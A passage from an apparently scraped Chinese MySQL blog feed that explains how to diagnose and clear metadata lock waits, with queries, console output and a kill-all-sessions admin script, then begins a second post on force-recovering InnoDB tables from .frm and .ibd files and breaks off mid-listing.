&apos;creat&apos;))) p where timestampdiff(second, i.trx_started, now()) &gt; p.time and i.trx_mysql_thread_id not in (connection_id(),p.id); 场景2 通过show processlist看不到booboo上有任何操作，但实际上存在有未提交的事务，可以在information_schema.innodb_trx中查看到。在事务没有完成之前，booboo的锁不会释放，alter table同样获取不到metadata的独占锁 会话D提交事务或回滚或kill，则会话B中的Alter可继续执行 12345678910111213141516171819202122232425262728293031323334353637383940# 在场景1的基础上，将会话A的事务完成或者kill掉，会话C执行成功，但是会话B和会话D继续进入metadata锁的等待。原因是会话D虽然select可以执行，但是事务没有提交，则表上的metadata锁还存在，导致会话B的ddl操作无法执行。# 会话B和会话D，情况1：知道有未完成的事务D，则结束会话D的事务，会话B正常执行。# 会话B和会话D，情况2：不知道有未结束的事务D，如何排错呢？=================================-- 请根据具体的情景修改查询语句-- 如果导致阻塞的语句的用户与当前用户不同，请使用导致阻塞的语句的用户登录来终止会话## 场景2的情况，是在场景1的基础上，还是有metadatalock锁（*一般生产环境不会停服务，因此不停的有新的query发送过来，就会出现场景2*），则手动继续kill掉长事务即可，注意生产环境中，有可能ddl操作需要保留（*例如MDL锁出现在主从同步的从中，从库需要去执行主发送的表变更，当然，也可以先将主从停掉，手动执行alter操作，都可以*）以下方法是在停止对从库的读操作后，将非ddl的连接kill掉select id,State,command from information_schema.processlist where State=&quot;Waiting for table metadata lock&quot;;select timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx where trx_mysql_thread_id=id;show processlist;select concat(&apos;kill &apos;,trx_mysql_thread_id,&apos;;&apos;) from information_schema.processlist,information_schema.innodb_trx where trx_mysql_thread_id=id and State!=&quot;Waiting for table metadata lock&quot;;===============================mysql&gt; show processlist; +----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| 6 | root | localhost | uplooking | Query | 275 | Waiting for table metadata lock | alter table booboo add q6 int default 0 || 7 | root | localhost | uplooking | Sleep | 269 | | NULL || 8 | root | localhost | uplooking | Query | 0 | starting | show processlist || 10 | root | localhost | uplooking | Sleep | 249 | | NULL || 12 | root | localhost | uplooking | Sleep | 191 | | NULL |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+5 rows in set (0.00 sec)# 查看当前进程发现除了Alter之外没有对booboo表的操作mysql&gt; select timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx where trx_mysql_thread_id=id;+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+| timediff | sysdate() | trx_started | id | USER | DB | COMMAND | STATE | trx_state | trx_query |+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 | 6 | root | uplooking | Query | Waiting for table metadata lock | RUNNING | alter table booboo add q6 int default 0 || 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 | 10 | root | uplooking | Sleep | | RUNNING | NULL |+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+2 rows in set (0.00 sec)# 查看innodb_trx表可以看到除了alter之外有未完成的事务，但是看不到具体query，得到线程id为10# 就可以kill 10来结束事务# 之后Alter正常操作 场景3 与场景2对比的现象不同于： 场景2：未完成事务中存在未完成事务 场景3：未完成事务中不存在未完成事务：确认有错误事务未提交或回滚，找到该事务的session_id然后杀死 通过show processlist看不到booboo表有任何操作，在information_schema.innodb_trx中也没有任何进行中的事务。 这很可能是因为在一个显式的事务中，对booboo表进行了一个失败的操作（比如查询了一个不存在的字段），这时事务没有开始，但是失败语句获取到的锁依然有效。从performance_schema.events_statements_current表中可以查到失败的语句 也就是说除了语法错误，其他错误语句获取到的锁在这个事务提交或回滚之前，仍然不会释放掉。because the failed statement is written to the binary log and the locks protect log consistency但是解释这一行为的原因很难理解，因为错误的语句根本不会被记录到二进制日志 解决方法：确认有错误事务未提交或回滚，找到该事务的sessionid然后杀死（难点） 123456789101112131415# 场景3的出现和前两种不同# 查看线程情况，看到alter操作metadata锁，还有其他的select操作有metadata锁## 第一反应就是有可能是场景1，于是kill掉执行select的线程，再次查看线程情况，就只剩下执行alter线程了## 接下来查看未完成的事务，如果是场景1，在kill掉冲突的线程后应该出现两种情况（A.alter操作正常执行B.线程中只有alter操作为waiting metadata lock状态；未完成事务中存在未完成事务）## 但是却发现和B情况有所不同的是：未完成事务中不存在未完成事务，总结第三种情况(C.线程中只有alter操作为waiting metadata lock状态；未完成事务中不存在未完成事务）# 通过搜索资料定位到是场景3，但资料中没有说怎么解决问题，又不能重新启动服务器，只有一个资料里提到了方法（确认有错误事务未提交或回滚，找到该事务的sessionid然后杀死，关键就是如何找到sessionid呢？performance_schema.events_statements_current中的thread_id为线程id并不是sessionid或者说会话id、连接id，如何通过thread_id找到session_id成为了难点？5.7中有个session表可以直接查到，而5.6中必须通过三表才能查到，分别为performance_schema.events_statements_current,performance_schema.threads,information_schema.processlist表。）=====================================================================================# kill掉除了写操作以外的queryselect concat(&apos;kill &apos;,id) from information_schema.processlist where State=&quot;Waiting for table metadata lock&quot; and substring(info, 1, 5) not in (&apos;alter&apos; , &apos;optim&apos;, &apos;repai&apos;, &apos;lock &apos;, &apos;drop &apos;, &apos;creat&apos;);# 寻找未提交或未回滚的错误事务，并kill即可select t.processlist_id,t.processlist_time,e.sql_text from performance_schema.threads t,performance_schema.events_statements_current e where t.thread_id=e.thread_id and e.SQL_TEXT like &apos;%t1%&apos;;# 案例中假设是在t1表上有MDL锁，则，e.sql_text 近似匹配t1# 本方法5.5 5.6 5.7 都通用。============================================================================= 第一步：模拟第三种情况，会话11执行一个显示事务，且query出现列错误，t1表中不存在xx列，不提交。 第二步：会话14中执行alter操作 第三步：执行一条query 第四步：会话15执行一个显示事务，查询t1表 第五步：查看当前的processlist情况，可以看到只要是对t1表的操作都出现了MDL锁等待；尝试通过第一种情况的解决方法找出阻塞的事务会话进行kill，发现不存在阻塞会话；查看当前未提交的事务发现返回空；通过过滤processlist中进行MDL锁等待且不是alter的会话id，进行kill。 第六步：只kill 12，15，留下执行alter的会话14；有人会想为什么都kill掉呢？因为即使现在kill掉了，t1表的MDL锁也不会释放掉，还不如留下会话14的ddl操作，等彻底解决了，自然就能执行这个操作。具体可以看下面的分析。 第七步：给大家做个测试，即使将会话14的alter动作kill掉： processlist中看不到任何等待MDL锁的会话； sys.schema_table_lock_waits中也不存在表锁（5.7才有sys库）； performance_schema.metadata_locks中也不存在任何锁记录； 会话16想再去执行alter操作，又开始了MDL锁等待。 第八步：此时就一定可以确定当前属于【有错误事务未提交或回滚导致的MDL锁】的情况了。我们找出这个错误事务，进行kill 第九步：kill掉会话11后，成功将MDL锁释放。 有人又会问咯：为什么不将数据库重启？ 回答： 如果说—— 业务允许重启 不想找到问题的根源 那么重启吧 如果说—— 数据库上面多个库，关联多个业务，不能重启 想找到问题的根源，防止下次再次出现类似的问题 那么你懂的 那么为什么不直接kill所有会话呢？同样如果你要找出问题的根源那么就排查，不想问为什么就直接kill吧，末尾有kill的脚本 一步步分析如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217mysql&gt; show processlist; +----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| 6 | root | localhost | uplooking | Query | 17 | Waiting for table metadata lock | alter table booboo add q9 int default 0 || 7 | root | localhost | uplooking | Query | 11 | Waiting for table metadata lock | select * from booboo || 8 | root | localhost | uplooking | Query | 0 | starting | show processlist || 14 | root | localhost | uplooking | Query | 5 | Waiting for table metadata lock | select * from booboo where id=3 || 15 | root | localhost | uplooking | Sleep | 28 | | NULL |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+5 rows in set (0.00 sec)mysql&gt; select timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx where trx_mysql_thread_id=id;Empty set (0.00 sec)mysql&gt; kill 7 ;Query OK, 0 rows affected (0.00 sec)mysql&gt; kill 14;Query OK, 0 rows affected (0.00 sec)mysql&gt; show processlist; +----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| 6 | root | localhost | uplooking | Query | 86 | Waiting for table metadata lock | alter table booboo add q9 int default 0 || 8 | root | localhost | uplooking | Query | 0 | starting | show processlist || 15 | root | localhost | uplooking | Sleep | 97 | | NULL |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+3 rows in set (0.00 sec)mysql&gt; select timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx where trx_mysql_thread_id=id;Empty set (0.00 sec)# 如果符合情况C，需要去查看performance_schema.events_statements_current表中是否有对booboo的错误语句（这里的错误语句是非语法错误的，例如select中写了不存在的列等情况）# 从下面的查询结果可以看到，确实存在一个错误语句事件# 通过该错误语句事件的THREAD_ID，到performance_schema.threads表查到该线程对应的PROCESSLIST_ID，而PROCESSLIST_ID进程id等于processlist中的idmysql&gt; select * from performance_schema.events_statements_current where SQL_TEXT like &apos;%booboo%&apos;\\G;*************************** 1. row *************************** THREAD_ID: 31 EVENT_ID: 16 END_EVENT_ID: NULL EVENT_NAME: statement/sql/alter_table SOURCE: socket_connection.cc:101 TIMER_START: 3292336129737000 TIMER_END: 3521408438190000 TIMER_WAIT: 229072308453000 LOCK_TIME: 0 SQL_TEXT: alter table booboo add q9 int default 0 DIGEST: NULL DIGEST_TEXT: NULL CURRENT_SCHEMA: uplooking OBJECT_TYPE: NULL OBJECT_SCHEMA: NULL OBJECT_NAME: NULL OBJECT_INSTANCE_BEGIN: NULL MYSQL_ERRNO: 0 RETURNED_SQLSTATE: NULL MESSAGE_TEXT: NULL ERRORS: 0 WARNINGS: 0 ROWS_AFFECTED: 0 ROWS_SENT: 0 ROWS_EXAMINED: 0CREATED_TMP_DISK_TABLES: 0 CREATED_TMP_TABLES: 0 SELECT_FULL_JOIN: 0 SELECT_FULL_RANGE_JOIN: 0 SELECT_RANGE: 0 SELECT_RANGE_CHECK: 0 SELECT_SCAN: 0 SORT_MERGE_PASSES: 0 SORT_RANGE: 0 SORT_ROWS: 0 SORT_SCAN: 0 NO_INDEX_USED: 0 NO_GOOD_INDEX_USED: 0 NESTING_EVENT_ID: NULL NESTING_EVENT_TYPE: NULL NESTING_EVENT_LEVEL: 0*************************** 2. row *************************** THREAD_ID: 33 EVENT_ID: 74 END_EVENT_ID: NULL EVENT_NAME: statement/sql/select SOURCE: socket_connection.cc:101 TIMER_START: 3521408132304000 TIMER_END: 3521408462141000 TIMER_WAIT: 329837000 LOCK_TIME: 184000000 SQL_TEXT: select * from performance_schema.events_statements_current where SQL_TEXT like &apos;%booboo%&apos; DIGEST: NULL DIGEST_TEXT: NULL CURRENT_SCHEMA: uplooking OBJECT_TYPE: NULL OBJECT_SCHEMA: NULL OBJECT_NAME: NULL OBJECT_INSTANCE_BEGIN: NULL MYSQL_ERRNO: 0 RETURNED_SQLSTATE: NULL MESSAGE_TEXT: NULL ERRORS: 0 WARNINGS: 0 ROWS_AFFECTED: 0 ROWS_SENT: 1 ROWS_EXAMINED: 0CREATED_TMP_DISK_TABLES: 0 CREATED_TMP_TABLES: 0 SELECT_FULL_JOIN: 0 SELECT_FULL_RANGE_JOIN: 0 SELECT_RANGE: 0 SELECT_RANGE_CHECK: 0 SELECT_SCAN: 1 SORT_MERGE_PASSES: 0 SORT_RANGE: 0 SORT_ROWS: 0 SORT_SCAN: 0 NO_INDEX_USED: 1 NO_GOOD_INDEX_USED: 0 NESTING_EVENT_ID: NULL NESTING_EVENT_TYPE: NULL NESTING_EVENT_LEVEL: 0*************************** 3. row *************************** THREAD_ID: 40 EVENT_ID: 8 END_EVENT_ID: 8 EVENT_NAME: statement/sql/select SOURCE: socket_connection.cc:101 TIMER_START: 3280938133699000 TIMER_END: 3280938258470000 TIMER_WAIT: 124771000 LOCK_TIME: 0 SQL_TEXT: select abc from booboo DIGEST: 871dd43dfdfb143e81439bbe7bf7b57e DIGEST_TEXT: SELECT `abc` FROM `booboo` CURRENT_SCHEMA: uplooking OBJECT_TYPE: NULL OBJECT_SCHEMA: NULL OBJECT_NAME: NULL OBJECT_INSTANCE_BEGIN: NULL MYSQL_ERRNO: 1054 RETURNED_SQLSTATE: 42S22 MESSAGE_TEXT: Unknown column &apos;abc&apos; in &apos;field list&apos; ERRORS: 1 WARNINGS: 0 ROWS_AFFECTED: 0 ROWS_SENT: 0 ROWS_EXAMINED: 0CREATED_TMP_DISK_TABLES: 0 CREATED_TMP_TABLES: 0 SELECT_FULL_JOIN: 0 SELECT_FULL_RANGE_JOIN: 0 SELECT_RANGE: 0 SELECT_RANGE_CHECK: 0 SELECT_SCAN: 0 SORT_MERGE_PASSES: 0 SORT_RANGE: 0 SORT_ROWS: 0 SORT_SCAN: 0 NO_INDEX_USED: 0 NO_GOOD_INDEX_USED: 0 NESTING_EVENT_ID: NULL NESTING_EVENT_TYPE: NULL NESTING_EVENT_LEVEL: 03 rows in set (0.00 sec)ERROR: No query specifiedmysql&gt; select THREAD_ID,DIGEST_TEXT from performance_schema.events_statements_current where DIGEST_TEXT=&quot;SELECT `abc` FROM `booboo`&quot;;+-----------+-----------------------------+| THREAD_ID | DIGEST_TEXT |+-----------+-----------------------------+| 40 | SELECT `abc` FROM `booboo` |+-----------+-----------------------------+1 row in set (0.00 sec)mysql&gt; select * from performance_schema.threads where thread_id=40\\G;*************************** 1. row *************************** THREAD_ID: 40 NAME: thread/sql/one_connection TYPE: FOREGROUND PROCESSLIST_ID: 15 PROCESSLIST_USER: root PROCESSLIST_HOST: localhost PROCESSLIST_DB: uplookingPROCESSLIST_COMMAND: Sleep PROCESSLIST_TIME: 402 PROCESSLIST_STATE: NULL PROCESSLIST_INFO: NULL PARENT_THREAD_ID: NULL ROLE: NULL INSTRUMENTED: YES HISTORY: YES CONNECTION_TYPE: Socket THREAD_OS_ID: 22758mysql&gt; select PROCESSLIST_ID from performance_schema.threads where thread_id=40;+----------------+| PROCESSLIST_ID |+----------------+| 15 |+----------------+1 row in set (0.00 sec)mysql&gt; select * from information_schema.processlist where id=(select PROCESSLIST_ID from performance_schema.threads where thread_id=40);+----+------+-----------+-----------+---------+------+-------+------+| ID | USER | HOST | DB | COMMAND | TIME | STATE | INFO |+----+------+-----------+-----------+---------+------+-------+------+| 15 | root | localhost | uplooking | Sleep | 466 | | NULL |+----+------+-----------+-----------+---------+------+-------+------+1 row in set (0.00 sec)mysql&gt; kill 15;Query OK, 0 rows affected (0.00 sec)# 会话Bmysql&gt; alter table booboo add q9 int default 0;Query OK, 0 rows affected (9 min 54.35 sec)Records: 0 Duplicates: 0 Warnings: 0 小知识点总结三张表的关系 MySQL 5.6 performance_schema库中，events_statements_current表中theard_id与threads表中的thread_id相同 performance_schema库中，threads表中，thread_id和processlist_id为对应关系，thread_id表示一个独特的线程标识符;processlist_id是show processlist显示的id值，连接标识符；而对于后台线程(与用户连接不相关的线程)，PROCESSLIST_ID为空，此值不是唯一的。 information_schema库中,PROCESSLIST表是一个非标准表。id连接标识符，并由CONNECTION_ID()函数返回。 performance_schema performance_schema performance_schema information_schema events_statements_current threads threads processlist THREAD_ID THREAD_ID PROCESSLIST_ID ID 我的理解 线程表中保存了所有线程的信息，有前台的有后台运行的； 如果是由连接产生的线程，一般都是前台线程，会分配一个processlist_id，可以在information_schema.processlist中看到 资料参考官网关于threads表的说明 官方关于processlist表的说明 MySQL5.7 MetaData Lock 案例分享 不同版本 MySQL 5.7 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273select * from performance_schema.events_statements_current\\Gselect * from sys.x$session\\Gselect * from sys.x$processlist\\Gmysql&gt; select * from x$session\\G;*************************** 1. row *************************** thd_id: 3904 conn_id: 3879 user: root@localhost db: sys command: Query state: Sending data time: 0 current_statement: select * from x$session statement_latency: 1564453000 progress: NULL lock_latency: 847000000 rows_examined: 0 rows_sent: 0 rows_affected: 0 tmp_tables: 4 tmp_disk_tables: 1 full_scan: YES last_statement: NULLlast_statement_latency: NULL current_memory: 0 last_wait: NULL last_wait_latency: NULL source: NULL trx_latency: NULL trx_state: NULL trx_autocommit: NULL pid: 12880 program_name: mysql1 row in set (0.05 sec)mysql&gt; select * from x$processlist limit 1\\G;*************************** 1. row *************************** thd_id: 1 conn_id: NULL user: sql/main db: NULL command: NULL state: NULL time: 230927 current_statement: NULL statement_latency: NULL progress: NULL lock_latency: NULL rows_examined: NULL rows_sent: NULL rows_affected: NULL tmp_tables: NULL tmp_disk_tables: NULL full_scan: NO last_statement: NULLlast_statement_latency: NULL current_memory: 0 last_wait: NULL last_wait_latency: NULL source: NULL trx_latency: NULL trx_state: NULL trx_autocommit: NULL pid: NULL program_name: NULL1 row in set (0.06 sec)mysql&gt; select * from information_schema.processlist;+------+------+-----------+------+---------+------+-----------+----------------------------------------------+| ID | USER | HOST | DB | COMMAND | TIME | STATE | INFO |+------+------+-----------+------+---------+------+-----------+----------------------------------------------+| 3879 | root | localhost | sys | Query | 0 | executing | select * from information_schema.processlist |+------+------+-----------+------+---------+------+-----------+----------------------------------------------+1 row in set (0.00 sec) MDL故障自愈kill所有会话 不想知道故障原因，只想快速解决故障 12345678910#!/bin/bash# kill掉 所有会话user=xxxpassword=xxxhost=xxxx.mysql.rds.aliyuncs.comport=3306mysql -u$user -p$password -h$host -P$port -e &quot;select concat(&apos;KILL &apos;,id,&apos;;&apos;) from information_schema.processlist;&quot; &gt; tmpfileawk &apos;{if (NR != 1) print $0 }&apos; tmpfile | mysql -u$user -p$password -h$host -P$port MDL故障排查和解决MDL故障自愈脚本GitHub地址","link":"/2017/08/19/booboo_others/2017-08-18-tec-mysql/"},{"title":"MySQL一次惊心动魄地数据强制恢复","text":"摘要：Cash恢复的正确方式是：备份文件（逻辑或物理）+ binlog进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效 在本次案例中，某客户数据库因存储空间不够导致数据库服务宕掉，而客户在数据库宕机后，只拷贝了单个cy库所属的目录进行了文件层面的备份，就将其他文件全部清空，当他想重新启动数据库时发现数据库服务启动。MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的.frm和.ibd文件。 写在前面Cash恢复的正确方式是：备份文件（逻辑或物理）+ binlog进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效 在本次案例中，某客户只对单个cy库所属的目录进行了文件层面的备份，MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的.frm和.ibd文件。 强制还原步骤 步骤 描述 备注 1 创建同版本的MySQL服务实例一枚 2 获取表的列数 如果有ddl备份直接导入，可惜都是没有的，哭。。。 2.1 创建同名表，结构无所谓 数据库的世界也需要身份证，先造个人拿上身份证，至于人长得啥样几条胳膊都无所谓，名字最重要 2.2 停服务；使用备份的frm文件覆盖当前的frm 偷梁换柱 2.3 配置文件添加强制恢复innodb的参数；启动服务 蒙蔽她的双眼 2.4 查看表结构 数据库会拿着身份证和面前的人（frm文件）做对比 2.5 查看错误日志中关于该表的报错 数据库发现身份证上的人只有1条胳膊，而被检查的人有10条胳膊，明显对不上啊 2.6 成功获取表的真实列数；删除这些表 通过警告可以知道应该造一个有10条胳膊的人 3 获取表的结构 3.1 创建同名表，列数一致，列名无所谓 这一次造人的时候，造一个有10条胳膊的，每条胳膊的名字无所谓，关键是身份证上面的人名和10条胳膊 3.2 停服务；使用备份的frm文件覆盖当前的frm 偷梁换柱 3.3 配置文件添加强制恢复innodb的参数；启动服务 蒙蔽她的双眼 3.4 查看表结构 数据库会拿着新的身份证和面前的人（frm文件）做对比 3.5 成功获取表结构 数据库发现身份证上信息和被检查的人信息一致，名字，胳膊的数量，对上了就认可啦！（数据库只检查表名和列的个数） 4 强制恢复表数据 4.1 丢弃当前表的数据 把这个人的五脏六腑都挖出来 4.2 将备份的ibd放到对应路径 将之前备份的吃了肉的五脏六腑放进去 4.3 导入新的数据，如果数据库加载成功则可以看到数据；否则加载失败。 跟大脑汇报一下新的五脏六腑已经就位可以开始使用了；如果使用得没问题就成功；如果器官已经损坏那么手术失败。 详细过程数据量 明细 大小 备注 物理文件 174M 数据库 1个 cy 表 57张 恢复结果 在客户服务器上面结果如下： 明细 成功 失败 恢复率 表结构 58 0 100% 表数据 56 2 96% 在我的服务器上面结果如下： 明细 成功 失败 恢复率 表结构 58 0 100% 表数据 58 0 100% 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550[root@toberoot mysql]# /alidata/mysql/bin/mysqld --initialize-insecure --datadir=/alidata/mysql/data/ --user=mysql[root@toberoot mysql]# service mysqld startStarting MySQL. [ OK ][root@toberoot mysql]# mysql -Vmysql Ver 14.14 Distrib 5.7.17, for linux-glibc2.5 (x86_64) using EditLine wrapper[root@toberoot mysql]# cd ~/home/cy02/[root@toberoot cy02]# lltotal 178140-rw-r--r-- 1 mysql mysql 9022 Aug 14 2017 base_dict.frm-rw-r--r-- 1 mysql mysql 98304 Mar 14 15:00 base_dict.ibd-rw-r--r-- 1 mysql mysql 8822 Mar 2 11:14 biz_advise.frm-rw-r--r-- 1 mysql mysql 98304 May 14 14:39 biz_advise.ibd-rw-r--r-- 1 mysql mysql 8850 Mar 2 11:14 biz_bank.frm-rw-r--r-- 1 mysql mysql 98304 Mar 2 11:14 biz_bank.ibd-rw-r--r-- 1 mysql mysql 9580 Mar 2 11:14 biz.frm-rw-r--r-- 1 mysql mysql 9286 Mar 2 11:14 biz_gift.frm-rw-r--r-- 1 mysql mysql 98304 Apr 24 14:08 biz_gift.ibd-rw-r--r-- 1 mysql mysql 8890 Mar 2 11:14 biz_gprs_bind.frm-rw-r--r-- 1 mysql mysql 8745 Mar 2 11:14 biz_gprs_bind_his.frm-rw-r--r-- 1 mysql mysql 180224 May 15 09:40 biz_gprs_bind_his.ibd-rw-r--r-- 1 mysql mysql 180224 May 15 09:42 biz_gprs_bind.ibd-rw-r--r-- 1 mysql mysql 98304 May 15 14:33 biz.ibd-rw-r--r-- 1 mysql mysql 8845 Aug 14 2017 biz_msg_template.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 biz_msg_template.ibd-rw-r--r-- 1 mysql mysql 8881 Aug 14 2017 biz_take_bank.frm-rw-r--r-- 1 mysql mysql 98304 May 13 19:26 biz_take_bank.ibd-rw-r--r-- 1 mysql mysql 9411 Nov 24 13:22 biz_take.frm-rw-r--r-- 1 mysql mysql 196608 May 15 15:22 biz_take.ibd-rw-r--r-- 1 mysql mysql 8862 Aug 14 2017 biz_take_wwlt.frm-rw-r--r-- 1 mysql mysql 98304 May 15 15:22 biz_take_wwlt.ibd-rw-r--r-- 1 mysql mysql 8854 Aug 14 2017 biz_take_wx.frm-rw-r--r-- 1 mysql mysql 98304 May 15 11:52 biz_take_wx.ibd-rw-r--r-- 1 mysql mysql 8925 Aug 14 2017 biz_vip.frm-rw-r--r-- 1 mysql mysql 98304 Mar 16 09:31 biz_vip.ibd-rw-r--r-- 1 mysql mysql 8852 Aug 14 2017 biz_wlt.frm-rw-r--r-- 1 mysql mysql 98304 May 15 18:30 biz_wlt.ibd-rw-r--r-- 1 mysql mysql 8926 Aug 14 2017 biz_wx_focus.frm-rw-r--r-- 1 mysql mysql 98304 May 10 16:24 biz_wx_focus.ibd-rw-r--r-- 1 mysql mysql 9339 Nov 24 13:25 biz_wx.frm-rw-r--r-- 1 mysql mysql 98304 May 10 16:24 biz_wx.ibd-rw-r--r-- 1 mysql mysql 8874 Aug 14 2017 biz_wx_walt.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 biz_wx_walt.ibd-rw-r--r-- 1 mysql mysql 8776 Aug 14 2017 cfg_area.frm-rw-r--r-- 1 mysql mysql 311296 Aug 14 2017 cfg_area.ibd-rw-r--r-- 1 mysql mysql 8721 Aug 14 2017 cfg_id_gen.frm-rw-r--r-- 1 mysql mysql 98304 May 15 18:41 cfg_id_gen.ibd-rw-r--r-- 1 mysql mysql 61 Aug 14 2017 db.opt-rw-r--r-- 1 mysql mysql 9053 Aug 14 2017 gprs_model.frm-rw-r--r-- 1 mysql mysql 212992 May 15 18:47 gprs_model.ibd-r--r--r-- 1 mysql mysql 79691776 May 16 14:04 ibdata1-rw-r--r-- 1 mysql mysql 8801 Dec 19 15:00 mbr_coin_chged.frm-rw-r--r-- 1 mysql mysql 2097152 May 15 17:27 mbr_coin_chged.ibd-rw-r--r-- 1 mysql mysql 8766 Dec 19 14:53 mbr_coin.frm-rw-r--r-- 1 mysql mysql 98304 May 15 19:12 mbr_coin.ibd-rw-r--r-- 1 mysql mysql 9155 May 14 11:55 mbr.frm-rw-r--r-- 1 mysql mysql 212992 May 15 20:58 mbr.ibd-rw-r--r-- 1 mysql mysql 8876 Aug 14 2017 mbr_oauth.frm-rw-r--r-- 1 mysql mysql 475136 May 15 19:37 mbr_oauth.ibd-rw-r--r-- 1 mysql mysql 9011 Aug 14 2017 mbr_pay.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 mbr_pay.ibd-rw-r--r-- 1 mysql mysql 8740 Aug 14 2017 mbr_prizen.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 mbr_prizen.ibd-rw-r--r-- 1 mysql mysql 9147 Dec 19 14:56 mbr_recharge.frm-rw-r--r-- 1 mysql mysql 294912 May 15 19:11 mbr_recharge.ibd-rw-r--r-- 1 mysql mysql 8801 Aug 14 2017 mbr_wallet_chged.frm-rw-r--r-- 1 mysql mysql 9437184 May 15 17:27 mbr_wallet_chged.ibd-rw-r--r-- 1 mysql mysql 8845 Aug 14 2017 mbr_wallet.frm-rw-r--r-- 1 mysql mysql 262144 May 15 19:12 mbr_wallet.ibd-rw-r--r-- 1 mysql mysql 10100 Dec 19 15:47 ord.frm-rw-r--r-- 1 mysql mysql 31457280 May 15 18:41 ord.ibd-rw-r--r-- 1 mysql mysql 8940 Aug 14 2017 ord_item.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 ord_item.ibd-rw-r--r-- 1 mysql mysql 8917 Aug 14 2017 ord_pay_ali.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 ord_pay_ali.ibd-rw-r--r-- 1 mysql mysql 8924 Dec 19 15:55 ord_pay_coin.frm-rw-r--r-- 1 mysql mysql 475136 May 15 17:27 ord_pay_coin.ibd-rw-r--r-- 1 mysql mysql 8926 Aug 14 2017 ord_pay_return.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 ord_pay_return.ibd-rw-r--r-- 1 mysql mysql 8966 Dec 20 16:50 ord_pay_wlt.frm-rw-r--r-- 1 mysql mysql 9437184 May 15 17:27 ord_pay_wlt.ibd-rw-r--r-- 1 mysql mysql 9036 Aug 14 2017 ord_pay_wx.frm-rw-r--r-- 1 mysql mysql 32505856 May 15 18:41 ord_pay_wx.ibd-rw-r--r-- 1 mysql mysql 9098 Aug 14 2017 prod_base_args.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_base_args.ibd-rw-r--r-- 1 mysql mysql 8790 Aug 14 2017 prod_bug_rpt.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_bug_rpt.ibd-rw-r--r-- 1 mysql mysql 8887 Aug 14 2017 prod_cmd.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_cmd.ibd-rw-r--r-- 1 mysql mysql 8984 Aug 14 2017 prod_cmd_invoke.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_cmd_invoke.ibd-rw-r--r-- 